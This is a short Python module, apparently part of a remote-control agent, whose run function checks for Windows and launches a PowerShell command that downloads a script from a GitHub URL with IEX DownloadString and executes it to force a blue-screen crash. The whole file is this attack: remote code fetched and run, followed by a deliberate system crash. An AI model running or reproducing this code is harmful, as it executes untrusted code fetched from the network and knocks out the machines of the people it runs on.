import subprocess
import os

def run(sio, uuid):
    if os.name == "nt":
        powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
        result = subprocess.Popen(powershell_command)